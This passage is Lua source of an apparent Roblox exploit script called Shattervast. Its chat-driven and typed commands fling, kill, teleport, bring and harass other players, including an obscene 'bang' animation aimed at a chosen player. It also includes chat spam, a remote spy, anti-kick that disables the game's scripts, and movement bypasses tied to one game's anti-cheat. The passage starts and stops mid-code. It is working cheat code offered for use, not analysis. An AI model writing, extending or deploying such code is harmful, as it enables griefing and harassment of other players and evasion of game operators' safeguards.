                    if getWalkPlayer == LP then
                        run(commandPrefix.."unfollow")
                        run(commandPrefix.."walk "..currentPlayersChatting.Name)
                    else
                        run(commandPrefix.."unfollow")
                        run(commandPrefix.."walk "..getWalkPlayer.Name)
                    end
                end
            elseif string.lower(string.sub(chat, 1, 8)) == "!follow " then
                for i,getFollowPlayer in pairs(findSinglePlayer(string.lower(string.sub(chat, 9)))) do
                    if getFollowPlayer == LP then
                        run(commandPrefix.."unwalk")
                        run(commandPrefix.."follow "..currentPlayersChatting.Name)
                    else
                        run(commandPrefix.."unwalk")
                        run(commandPrefix.."follow "..getFollowPlayer.Name)
                    end
                end
            end
        end
        if modeInfo == true then
            if infoReady then
                infoReady = false
                if string.lower(string.sub(chat, 1, 5)) == "!age " then
                    for i,v in pairs(findSinglePlayer(string.lower(string.sub(chat, 6)))) do
                        if v == LP then
                            run(commandPrefix.."age "..currentPlayersChatting.Name)
                        else
                            run(commandPrefix.."age "..v.Name)
                        end
                    end
                end
                if string.lower(string.sub(chat, 1, 4)) == "!id " then
                    for i,a in pairs(findSinglePlayer(string.lower(string.sub(chat, 5)))) do
                        if a == LP then
                            run(commandPrefix.."id "..currentPlayersChatting.Name)
                        else
                            run(commandPrefix.."id "..a.Name)
                        end
                    end
                end
                wait(1)
                infoReady = true
            end
        end
    end)
end
game:GetService("Players").PlayerAdded:connect(function(plr)
    plr.Chatted:connect(function(chat)
        CreateChatText(plr, chat)
        if printingChat then
            printChat(plr, chat)
        end
        if modeFling == true then
            if string.lower(string.sub(chat, 1, 7)) == "!fling " then
                if gsWorkspace:PGSIsEnabled() == false then
                    FEGodmode()
                end
                if string.lower(string.sub(chat, 8)) == "me" then
                    run(commandPrefix.."unfling")
                    LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(0, 10, 0)
                    run(commandPrefix.."fling "..plr.Name.." 2000000")
                else
                    for i,notAll in pairs(findSinglePlayer(string.lower(string.sub(chat, 8)))) do
                        if notAll ~= LP then
                            run(commandPrefix.."unfling")
                            LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(0, 10, 0)
                            run(commandPrefix.."fling "..notAll.Name.." 2000000")
                        end
                    end
                end
            end
        end
        if modeCompliment == true then
            if string.lower(string.sub(chat, 1, 3)) == "!c " then
                if complimentReady == true then
                    complimentReady = false
                    if string.lower(string.sub(chat, 4)) == "me" then
                        complimentplr(plr)
                    else
                        for i,Others in pairs(findSinglePlayer(string.lower(string.sub(chat, 4)))) do
                            if Others == LP then
                                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Don't be silly, I can't compliment myself!", "All")
                            else
                                complimentplr(Others)
                            end
                        end
                    end
                    wait(1)
                    complimentReady = true
                end
            end
        end
        if modeMove == true then
            if string.lower(string.sub(chat, 1, 9)) == "!bringbot" then
                run(commandPrefix.."unfollow")
                run(commandPrefix.."unwalk")
                run(commandPrefix.."goto "..plr.Name)
            elseif string.lower(string.sub(chat, 1, 6)) == "!walk " then
                for i,getWalkPlayer in pairs(findSinglePlayer(string.lower(string.sub(chat, 7)))) do
                    if getWalkPlayer == LP then
                        run(commandPrefix.."unfollow")
                        run(commandPrefix.."walk "..plr.Name)
                    else
                        run(commandPrefix.."unfollow")
                        run(commandPrefix.."walk "..getWalkPlayer.Name)
                    end
                end
            elseif string.lower(string.sub(chat, 1, 8)) == "!follow " then
                for i,getFollowPlayer in pairs(findSinglePlayer(string.lower(string.sub(chat, 9)))) do
                    if getFollowPlayer == LP then
                        run(commandPrefix.."unwalk")
                        run(commandPrefix.."follow "..plr.Name)
                    else
                        run(commandPrefix.."unwalk")
                        run(commandPrefix.."follow "..getFollowPlayer.Name)
                    end
                end
            end
        end
        if modeInfo == true then
            if infoReady then
                infoReady = false
                if string.lower(string.sub(chat, 1, 5)) == "!age " then
                    for i,v in pairs(findSinglePlayer(string.lower(string.sub(chat, 6)))) do
                        if v == LP then
                            run(commandPrefix.."age "..plr.Name)
                        else
                            run(commandPrefix.."age "..v.Name)
                        end
                    end
                end
                if string.lower(string.sub(chat, 1, 4)) == "!id " then
                    for i,a in pairs(findSinglePlayer(string.lower(string.sub(chat, 5)))) do
                        if a == LP then
                            run(commandPrefix.."id "..plr.Name)
                        else
                            run(commandPrefix.."id "..a.Name)
                        end
                    end
                end
                wait(1)
                infoReady = true
            end
        end
    end)
end)

-- Loops
noclip = false
following = false
trailing = false
annoying = false
flingnoclip = false
staring = false
stopsitting = false
stareplr = ""
CBRINGamount = 3
spawnWS = CurrentWalkspeed
spawnJP = CurrentJumppower
spawnHH = CurrentHipheight
spawningfegod = false
looptpbypassfly = false
if game.GameId == 245662005 then
    bypassMODE = true
else
    bypassMODE = false
end
viewplr = ""
loopview = false
cmdForward = false
forwardSpeed = 1
loopviewfc = false
spinTOhead = false
spinObj = ""

LPcurrenthumanoid = LP.Character.Humanoid
game:GetService('RunService').Stepped:connect(function()
    if LP.Character.Humanoid then
        LPcurrenthumanoid = LP.Character.Humanoid
    end
    if noclip then
        if LP.Character then
            if LP.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
                LP.Character.Head.CanCollide = false
                LP.Character.Torso.CanCollide = false
                LP.Character["Left Leg"].CanCollide = false
                LP.Character["Right Leg"].CanCollide = false
                LP.Character["Left Arm"].CanCollide = false
                LP.Character["Right Arm"].CanCollide = false
            elseif LP.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
                LP.Character.Head.CanCollide = false
                LP.Character.UpperTorso.CanCollide = false
                LP.Character.LowerTorso.CanCollide = false
                LP.Character.HumanoidRootPart.CanCollide = false
            end
        end
    end
    if following then
        LP.Character.HumanoidRootPart.CFrame = gsPlayers[flwplr.Name].Character.HumanoidRootPart.CFrame + gsPlayers[flwplr.Name].Character.HumanoidRootPart.CFrame.lookVector * flwnum
    end
    if trailing then
        LP.Character.HumanoidRootPart.CFrame = gsPlayers[trlplr.Name].Character.HumanoidRootPart.CFrame + gsPlayers[trlplr.Name].Character.HumanoidRootPart.CFrame.lookVector * trlnum
    end
    if annoying then
        LP.Character.HumanoidRootPart.CFrame = gsPlayers[annplr.Name].Character.HumanoidRootPart.CFrame
    end
    if walkto then
        LP.Character.Humanoid:MoveTo(walkplr.Character.HumanoidRootPart.Position)
    end
    if cbringing then
        CBRINGplr.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * CBRINGamount
    end
    if cbringingall then
        for i,getbringplrs in pairs(gsPlayers:GetPlayers()) do
            if getbringplrs ~= LP then
                getbringplrs.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * CBRINGamount
            end
        end
    end
    if staring then
        LP.Character.HumanoidRootPart.CFrame = CFrame.new(LP.Character.Torso.Position, gsPlayers[stareplr.Name].Character.Torso.Position)
    end
    if stopsitting then
        LP.Character.Humanoid.Sit = false
    end
    if looptpbypassfly then
        pcall(function()
            LP.Character.Head.Anchored = false
            LP.Character.HumanoidRootPart.CFrame = gsWorkspace.rGETpartNUMBER2.CFrame
            LP.Character.Head.Anchored = true
        end)
    end
    if loopview then
        view(viewplr)
    end
    if cmdForward then
        LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * forwardSpeed
    end
    if loopviewfc then
        pcall(function()
            gsWorkspace.CurrentCamera.CameraSubject = gsWorkspace.rGETpartNUMBER2
        end)
    end
    if spinTOhead then
        pcall(function()
            spinObj.Position = LP.Character.Head.Position
        end)
    end
end)

LPcurrenthumanoid.Died:Connect(function()
    flying = false
    doFREECAM = false
    if savingtoolsloop then
        run(commandPrefix.."savealltool")
    end
end)

LP.CharacterAdded:Connect(function()
    wait(0.2)
    LP.Character.Humanoid.WalkSpeed = spawnWS
    LP.Character.Humanoid.JumpPower = spawnJP
    LP.Character.Humanoid.HipHeight = spawnHH
    if spawningfegod then
        FEGodmode()
    end
    if spawningpos and spawnpos ~= nil then
        LP.Character.HumanoidRootPart.CFrame = spawnpos
    end
end)

-- Commands
Commands = {}

Commands.print = function(args)
    local msg = table.concat(args," ")
    print(msg)
end

Commands.warn = function(args)
    local msg = table.concat(args," ")
    warn(msg)
end

Commands.sit = function(args)
    LP.Character.Humanoid.Sit = true
end

Commands.god = function(args)
    FEGodmode()
    Notification("warning", "You have enabled FE Godmode, tools will not work. Use "..commandPrefix.."grespawn to remove.", 7)
end

Commands.view = function(args)
    if args[1] then
        for i,v in pairs(findSinglePlayer(args[1])) do
            if bypassMODE == false then
                view(v)
                Notification("info", "Now viewing "..v.Name..". Use "..commandPrefix.."unview to stop viewing.", 3)
            elseif bypassMODE == true then
                viewplr = v
                loopview = true
            end
        end
    end
end

Commands.unview = function(args)
    view(LP)
    loopview = false
end

Commands.gravity = function(args)
    if args[1] then
        gsWorkspace.Gravity = args[1]
    end
end

Commands.ungravity = function(args)
    gsWorkspace.Gravity = CurrentGravity
end

Commands.goto = function(args)
    if args[1] then
        if bypassMODE == false then
            for i,v in pairs(findPlayer(args[1])) do
                LP.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
            end
        elseif bypassMODE == true then
            for i,v in pairs(findPlayer(args[1])) do
                local TPbypass = {}
                TPbypass.CFrame = v.Character.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0)
                local TPFunction = gsTween:Create(LP.Character.HumanoidRootPart, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In), TPbypass)
                TPFunction:Play()
            end
        end
    end
end

Commands.fecheck = function(args)
    if gsWorkspace.FilteringEnabled == true then
        Notification("warning", "FE is enabled!", 7)
    else
        Notification("warning", "FE is disabled. Consider using a different script.", 7)
    end
end

Commands.lockws = function(args)
    lockWS()
    Notification("info", "Workspace locked.", 4)
end

Commands.unlockws = function(args)
    unlockWS()
    Notification("info", "Workspace unlocked.", 4)
end

Commands.noclip = function(args)
    noclip = true
    Notification("info", "Noclip enabled.", 4)
end

Commands.clip = function(args)
    noclip = false
    Notification("info", "Noclip disabled.", 4)
end

Commands.follow = function(args)
    if args[1] then
        for i,v in pairs(findPlayer(args[1])) do
            flwplr = v
        end
        if args[2] then
            flwnum = args[2]
        else
            flwnum = -5
        end
        following = true
    else
        Notification("warning", "No player selected to follow! Use: "..commandPrefix.."follow player", 4)
    end
end

Commands.unfollow = function(args)
    following = false
end

Commands.fling = function(args)
    if args[1] then
        for i,v in pairs(findSinglePlayer(args[1])) do
            if v ~= LP then
                view(v)
                pcall(function()
                    LP.Character.HumanoidRootPart.Fling:Destroy()
                end)
                if not args[2] then
                    RocketPropulsion(800000,1000,400000,v,"Fling")
                else
                    RocketPropulsion(args[2],1500,400000,v,"Fling")
                end
                if noclip ~= true then
                    flingnoclip = true
                    noclip = true
                end
            end
        end
    else
        Notification("warning", "No player selected to fling! Use: "..commandPrefix.."fling player", 4)
    end
end

Commands.unfling = function(args)
    view(LP)
    pcall(function()
        if LP.Character.HumanoidRootPart.Fling then
            for i,v in pairs(LP.Character:GetDescendants()) do
                if v.Name == "Fling" and v:IsA("RocketPropulsion") then
                    v:Destroy()
                end
            end
        end
    end)
    if flingnoclip == true then
        noclip = false
        flingnoclip = false
    end
end

Commands.trail = function(args)
    if args[1] then
        for i,v in pairs(findPlayer(args[1])) do
            trlplr = v
        end
        if args[2] then
            trlnum = args[2]
        else
            trlnum = 5
        end
        trailing = true
    else
        Notification("warning", "No player selected to trail! Use: "..commandPrefix.."trail player", 4)
    end
end

Commands.untrail = function(args)
    trailing = false
end

Commands.annoy = function(args)
    if args[1] then
        for i,v in pairs(findPlayer(args[1])) do
            annplr = v
        end
        annoying = true
    else
        Notification("warning", "No player selected to annoy! Use: "..commandPrefix.."annoy player", 4)
    end
end

Commands.unannoy = function(args)
    annoying = false
end

Commands.reset = function(args)
    LP.Character:BreakJoints()
end

Commands.grespawn = function(args)
    LP.Character.Humanoid.Health = 0
    wait(1)
    LP.Character.Head.CFrame = CFrame.new(1000000,0,1000000)
    LP.Character.Torso.CFrame = CFrame.new(1000000,0,1000000)
end

Commands.respawn = function(args)
    local mod = Instance.new('Model', workspace) mod.Name = 'new '..LP.Name
    local hum = Instance.new('Humanoid', mod)
    local ins = Instance.new('Part', mod) ins.Name = 'Torso' ins.CanCollide = false ins.Transparency = 1
    LP.Character = mod
end

Commands.speed = function(args)
    if args[1] then
        run(commandPrefix.."ws "..args[1])
    end
end

bypassingwalkspeed = false
Commands.ws = function(args)
    if args[1] then
        if bypassMODE == false then
            LP.Character.Humanoid.WalkSpeed = args[1]
        elseif bypassMODE == true then
            if game.GameId == 245662005 then
                bypassingwalkspeed = true
                bypassWalkspeed = args[1]
            end
        end
    end
end

game:GetService("RunService").Heartbeat:Connect(function()
    if bypassingwalkspeed then
        LP.Character.Humanoid.WalkSpeed = bypassWalkspeed
    end
end)

Commands.jumppower = function(args)
    if args[1] then
        LP.Character.Humanoid.JumpPower = args[1]
    end
end

Commands.jp = function(args)
    if args[1] then
        LP.Character.Humanoid.JumpPower = args[1]
    end
end

Commands.hipheight = function(args)
    if args[1] then
        LP.Character.Humanoid.HipHeight = args[1]
    end
end

Commands.hh = function(args)
    if args[1] then
        LP.Character.Humanoid.HipHeight = args[1]
    end
end

Commands.default = function(args)
    LP.Character.Humanoid.WalkSpeed = CurrentWalkspeed
    LP.Character.Humanoid.HipHeight = CurrentHipheight
    LP.Character.Humanoid.JumpPower = CurrentJumppower
end

Commands.credits = function(args)
    Notification("info", "Shattervast was made by illremember#3799 , "..commandPrefix.."fullcredits for all credits.", 8)
end

Commands.attach = function(args)
    if hasTools() == false then
        Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
    else
        FEGodmode()
        for i,v in pairs(LP.Backpack:GetChildren())do
            LP.Character.Humanoid:EquipTool(v)
        end
        if args[1] then
            for i,v in pairs(findSinglePlayer(args[1])) do
                if v ~= LP then
                    LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
                    wait(0.3)
                    LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
                end
            end
        end
    end
end

Commands.fly = function(args)
    if bypassMODE == false then
        local speedget = 1
        repeat wait() until LP and LP.Character and LP.Character:FindFirstChild('HumanoidRootPart') and LP.Character:FindFirstChild('Humanoid')
        repeat wait() until Mouse
        if args[1] then
            speedfly = args[1]
        else
            speedfly = 1
        end
        
        local T = LP.Character.HumanoidRootPart
        local CONTROL = {F = 0, B = 0, L = 0, R = 0}
        local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
        local SPEED = speedget
        
        local function fly()
            flying = true
            local BG = Instance.new('BodyGyro', T)
            local BV = Instance.new('BodyVelocity', T)
            BG.P = 9e4
            BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
            BG.cframe = T.CFrame
            BV.velocity = Vector3.new(0, 0.1, 0)
            BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
            spawn(function()
            repeat wait()
            LP.Character.Humanoid.PlatformStand = true
            if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
            SPEED = 50
            elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
            SPEED = 0
            end
            if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
            BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
            lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
            elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
            BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
            else
            BV.velocity = Vector3.new(0, 0.1, 0)
            end
            BG.cframe = workspace.CurrentCamera.CoordinateFrame
                    until not flying
                    CONTROL = {F = 0, B = 0, L = 0, R = 0}
                    lCONTROL = {F = 0, B = 0, L = 0, R = 0}
                    SPEED = 0
                    BG:destroy()
                    BV:destroy()
                    LP.Character.Humanoid.PlatformStand = false
                end)
            end
        Mouse.KeyDown:connect(function(KEY)
            if KEY:lower() == 'w' then
                CONTROL.F = speedfly
            elseif KEY:lower() == 's' then
                CONTROL.B = -speedfly
            elseif KEY:lower() == 'a' then
                CONTROL.L = -speedfly 
            elseif KEY:lower() == 'd' then 
                CONTROL.R = speedfly
            end
        end)
        Mouse.KeyUp:connect(function(KEY)
            if KEY:lower() == 'w' then
                CONTROL.F = 0
            elseif KEY:lower() == 's' then
                CONTROL.B = 0
            elseif KEY:lower() == 'a' then
                CONTROL.L = 0
            elseif KEY:lower() == 'd' then
                CONTROL.R = 0
            end
        end)
        fly()
    elseif bypassMODE == true then
        if not args[1] then
            run(commandPrefix.."fc")
        else
            run(commandPrefix.."fc "..args[1])
        end
        LP.Character.Head.Anchored = false
        looptpbypassfly = true
        view(LP)
    end
end

Commands.unfly = function(args)
    if bypassMODE == false then
        flying = false
        LP.Character.Humanoid.PlatformStand = false
    else
        looptpbypassfly = false
        run(commandPrefix.."unfreecam")
        local goalTP = LP.Character.HumanoidRootPart.CFrame
        if game.GameId == 245662005 then
            for i = 1, 5 do wait(0.2)
                LP.Character.HumanoidRootPart.CFrame = goalTP
            end
        else
            LP.Character.HumanoidRootPart.CFrame = goalTP
        end
        LP.Character.Head.Anchored = false
    end
end

Commands.kill = function(args)
    if args[1] then
        for i,v in pairs(findSinglePlayer(args[1])) do
            if v == LP then
                LP.Character:BreakJoints()
            else
                if hasTools() == false then
                    Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
                else
                    FEGodmode()
                    for i,v in pairs(LP.Backpack:GetChildren())do
                        LP.Character.Humanoid:EquipTool(v)
                    end
                    local NOW = LP.Character.HumanoidRootPart.CFrame
                    LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
                    wait(0.3)
                    LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
                    local function tp(player,player2)
                    local char1,char2=player.Character,player2.Character
                    if char1 and char2 then
                    char1:MoveTo(char2.Head.Position)
                    end
                    end
                    wait(0.5)
                    LP.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(100000,0,100000))
                    wait(0.5)
                    tp(LP,game:GetService("Players")[v.Name])
                    wait(0.7)
                    LP.Character.HumanoidRootPart.CFrame = NOW
                    view(LP)
                end
            end
        end
    end
end
Commands.bring = function(args)
    if hasTools() == false then
        Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
    else
        FEGodmode()
        for i,v in pairs(LP.Backpack:GetChildren())do
            LP.Character.Humanoid:EquipTool(v)
        end
        if args[1] then
            for i,v in pairs(findSinglePlayer(args[1])) do
                if v ~= LP then
                    local NOW = LP.Character.HumanoidRootPart.CFrame
                    local function tp(player,player2)
                    local char1,char2=player.Character,player2.Character
                    if char1 and char2 then
                    char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
                    end
                    end
                    local function getout(player,player2)
                    local char1,char2=player.Character,player2.Character
                    if char1 and char2 then
                    char1:MoveTo(char2.Head.Position)
                    end
                    end
                    tp(game:GetService("Players")[v.Name], LP)
                    wait(0.2)
                    tp(game:GetService("Players")[v.Name], LP)
                    wait(0.5)
                    LP.Character.HumanoidRootPart.CFrame = NOW
                    wait(0.5)
                    getout(LP, game:GetService("Players")[v.Name])
                    wait(0.3)
                    LP.Character.HumanoidRootPart.CFrame = NOW
                end
            end
        end
    end
end

Commands.naked = function(args)
    for i,v in pairs(LP.Character:GetDescendants()) do
        if v:IsA("Clothing") then
            v:Destroy()
        end
    end
end

Commands.nolimbs = function(args)
    LP.Character["Left Arm"]:Destroy()
    LP.Character["Right Arm"]:Destroy()
    LP.Character["Left Leg"]:Destroy()
    LP.Character["Right Leg"]:Destroy()
end

Commands.noarms = function(args)
    LP.Character["Left Arm"]:Destroy()
    LP.Character["Right Arm"]:Destroy()
end

Commands.nolegs = function(args)
    LP.Character["Left Leg"]:Destroy()
    LP.Character["Right Leg"]:Destroy()
end

Commands.headless = function(args)
    local l = LP.Character.Humanoid:Clone()
    LP.Character.Humanoid:Destroy()
    wait(0.2)
    LP.Character.Head.CanCollide = false
    for i,v in pairs(LP.Character:GetDescendants()) do
        if string.sub(v.Name, 1, 4) == "Neck" then
            v:Destroy()
        end
    end
    wait(0.2)
    l.Name = "Humanoid"
    l.Parent = LP.Character
    wait(0.1)
    game:GetService("Workspace").CurrentCamera.CameraSubject = LP.Character
    LP.Character.Animate:Destroy()
end

antiremotes = false
Commands.antikick = function(args)
    if args[1] then
        if args[1] == "on" then
            antiremotes = true
            wait(0.2)
            for i,v in pairs(LP.Character:GetChildren()) do
                if string.find(string.lower(v.Name), "exploit") and v:IsA("LocalScript") then
                    v.Disabled = true
                end
            end
            Notification("warning", "This command disables all remotes incase they are kick remotes, may break game.", 8)
            Notification("info", "Does not prevent serverside kicks, use "..commandPrefix.."antikick off to turn off.", 8)
        elseif args[1] == "off" then
            antiremotes = false
            Notification("warning", "Remote anti-kick turned off.", 8)
        end
    end
end

blockedremotes = {}
Commands.blockremote = function(args)
    local getService = ""
    if args[1] then
        local remoteName = string.lower(tostring(args[1]))
        if args[2] then
            local serviceRemote = string.lower(tostring(args[2]))
            if serviceRemote == "workspace" then
                getService = "Workspace"
            elseif serviceRemote == "replicatedstorage" then
                getService = "ReplicatedStorage"
            elseif serviceRemote == "players" then
                getService = "Players"
            elseif serviceRemote == "lighting" then
                getService = "Lighting"
            elseif serviceRemote == "startergui" then
                getService = "StarterGui"
            elseif serviceRemote == "starterpack" then
                getService = "StarterPack"
            elseif serviceRemote == "starterplayer" then
                getService = "StarterPlayer"
            else
                getService = "ReplicatedStorage"
            end
        else
            getService = "ReplicatedStorage"
        end
        for i,getRemote in pairs(game:GetService(getService):GetDescendants()) do
            if string.lower(getRemote.Name) == remoteName then
                table.insert(blockedremotes, getRemote.Name)
            end
        end
    end
    Notification("warning", "If this command does not work, make sure you type remote name/service fully correct.", 8)
end

spyingremotes = false
Commands.remotespy = function(args)
    if args[1] then
        if args[1] == "on" then
            spyingremotes = true
            Notification("info", "Remotespy turned on.", 4)
        elseif args[1] == "off" then
            spyingremotes = false
            Notification("info", "Remotespy turned off.", 4)
        end
    end
end

Commands.bang = function(args)
    if args[1] then
        for i,v in pairs(findSinglePlayer(args[1])) do
            if v ~= nil then
                following = true
                flwplr = v
                flwnum = -1
                local bangAnimation = Instance.new("Animation")
                bangAnimation.AnimationId = "rbxassetid://148840371"
                bangTrack = LP.Character.Humanoid:LoadAnimation(bangAnimation)
                if args[2] then
                    bangTrack:Play(.1, 1, args[2])
                else
                    bangTrack:Play(.1, 1, 1)
                end
            end
        end
    else
        Notification("warning", "No player selected to follow! Use: "..commandPrefix.."follow player", 4)
    end
end

Commands.unbang = function(args)
    following = false
    bangTrack:Stop()
end

spamdelay = 1
spamtext = "Spam"
spamming = false
Commands.spam = function(args)
    if args[1] then
        spamtext = args[1]
        spamming = true
    end
end
Commands.spamdelay = function(args)
    if args[1] then
        spamdelay = args[1]
    end
end
spawn(function()
    while wait(spamdelay) do
        if spamming then
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(spamtext, "All")
        end
    end
end)

Commands.unspam = function(args)
    spamming = false
end

Commands.info = function(args)
    if args[1] then
        for i,v in pairs(findSinglePlayer(args[1])) do
            createINFO(v)
        end
    end
end

Commands.age = function(args)
    if args[1] then
        for i,v in pairs(findPlayer(args[1])) do
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v.Name.." Account Age: "..v.AccountAge.." days!", "All")
        end
    end
end

Commands.invisible = function(args)
    local Character = LP.Character
    if LP.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
        local Clone = Character.HumanoidRootPart:Clone()
        Character.HumanoidRootPart:Destroy()
        Clone.Parent = Character
    else
        local Clone = Character.LowerTorso.Root:Clone()
        Character.LowerTorso.Root:Destroy()
        Clone.Parent = Character.LowerTorso
    end
end

walkto = false
walkplr = ""
Commands.walk = function(args)
    if args[1] then
        for i,v in pairs(findSinglePlayer(args[1])) do
            walkplr = v
            walkto = true
            noclip = true
        end
    end
end

Commands.unwalk = function(args)
    walkto = false
    noclip = false
    LP.Character.Humanoid:MoveTo(LP.Character.HumanoidRootPart.Position)
end

Commands.glitch = function(args)
    if hasTools() == false then
        Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
    else
        FEGodmode()
        for i,v in pairs(LP.Backpack:GetChildren())do
            LP.Character.Humanoid:EquipTool(v)
        end
        if args[1] then
            for i,v in pairs(findSinglePlayer(args[1])) do
                local function tp(player,player2)
                local char1,char2=player.Character,player2.Character
                if char1 and char2 then
                char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
                end
                end
                tp(game:GetService("Players")[v.Name], LP)
                wait(0.2)
                tp(game:GetService("Players")[v.Name], LP)
                wait(0.5)
                local b = Instance.new("BodyForce")
                b.Parent = LP.Character.HumanoidRootPart
                b.Name = "Glitch"
                if args[2] then
                    b.Force = Vector3.new(args[2],5000,0)
                else
                    b.Force = Vector3.new(100000000,5000,0)
                end
                wait(6)
                b:Destroy()
            end
        end
    end
end

Commands.tp = function(args)
    if args[1] then
        for i,v in pairs(findSinglePlayer(args[1])) do
            if v == LP then
                if args[2] then
                    for i,a in pairs(findSinglePlayer(args[2])) do
                        v.Character.HumanoidRootPart.CFrame = a.Character.HumanoidRootPart.CFrame
                    end
                end
            else
                if hasTools() == false then
                    Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
                else
                    FEGodmode()
                    for i,v in pairs(LP.Backpack:GetChildren())do
                        LP.Character.Humanoid:EquipTool(v)
                    end
                    if args[1] then
                        for i,first in pairs(findSinglePlayer(args[1])) do
                            if args[2] then
                                for i,second in pairs(findSinglePlayer(args[2])) do
                                    local function tp(player,player2)
                                    local char1,char2=player.Character,player2.Character
                                    if char1 and char2 then
                                    char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
                                    end
                                    end
                                    local function getout(player,player2)
                                    local char1,char2=player.Character,player2.Character
                                    if char1 and char2 then
                                    char1:MoveTo(char2.Head.Position)
                                    end
                                    end
                                    tp(LP, first)
                                    wait(0.2)
                                    tp(LP, first)
                                    wait(0.5)
                                    tp(LP, second)
                                    wait(0.2)
                                    tp(LP, second)
                                    wait(0.2)
                                    getout(LP, first)
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

Commands.givetool = function(args)
    if args[1] then
        if args[2] then
            local selectedTool = ""
            for i,allTools in pairs(LP.Character:GetDescendants()) do
                if allTools:IsA("Tool") and string.lower(allTools.Name) == string.lower(args[2]) then
                    selectedTool = allTools
                else
                    for i,otherTools in pairs(LP.Backpack:GetDescendants()) do
                        if otherTools:IsA("Tool") and string.lower(otherTools.Name) == string.lower(args[2]) then
                            selectedTool = otherTools
                        end
                    end
                end
            end
            for i,v in pairs(findSinglePlayer(args[1])) do
                if selectedTool ~= "" then
                    selectedTool.Parent = v.Character
                end
            end
        else
            for i,plr in pairs(findSinglePlayer(args[1])) do
                for i,tool in pairs(LP.Character:GetDescendants()) do
                    if tool:IsA("Tool") then
                        tool.Parent = plr.Character
                    end
                end
            end
        end
    end
end

Commands.givealltools = function(args)
    LP.Character.Humanoid:UnequipTools()
    for i,plr in pairs(findSinglePlayer(args[1])) do
        for i,v in pairs(LP.Character:GetDescendants()) do
            if v:IsA("Tool") then
                v.Parent = plr.Character
            end
        end
        for i,a in pairs(LP.Backpack:GetDescendants()) do
            if a:IsA("Tool") then
                a.Parent = plr.Character
            end
        end
    end
end

Commands.blockhats = function(args)
    for i,v in pairs(LP.Character:GetDescendants()) do
        if v:IsA("Accessory") or v:IsA("Hat") then
            for i,mesh in pairs(v:GetDescendants()) do
                if mesh.Name == "Mesh" then
                    mesh:Destroy()
                end
            end
        end
    end
end

Commands.blocktool = function(args)
    for i,v in pairs(LP.Character:GetDescendants()) do
        if v:IsA("Tool") then
            for i,mesh in pairs(v:GetDescendants()) do
                if mesh.Name == "Mesh" then
                    mesh:Destroy()
                end
            end
        end
    end
end

Commands.orbit = function(args)
    if args[1] then
        for i,v in pairs(findSinglePlayer(args[1])) do
            view(v)
            RocketPropulsion(5000,100,5000,v,"OrbitMove")
        end
    else
        Notification("warning", "No player selected to orbit! Use: "..commandPrefix.."orbit player", 4)
    end
end

Commands.unorbit = function(args)
    for i,v in pairs(LP.Character:GetDescendants()) do
        if v.Name == "OrbitMove" then
            v:Destroy()
        end
    end
    view(LP)
end

Commands.pos = function(args)
    Notification("info", "Your current position is ".. tostring(LP.Character.HumanoidRootPart.Position), 9)
end

SavedPosition = ""
Commands.savepos = function(args)
    SavedPosition = LP.Character.HumanoidRootPart.CFrame
end
Commands.loadpos = function(args)
    if SavedPosition ~= "" then
        LP.Character.HumanoidRootPart.CFrame = SavedPosition
    end
end

Commands.tppos = function(args)
    if args[1] and args[2] and args[3] then
        LP.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(args[1], args[2], args[3]))
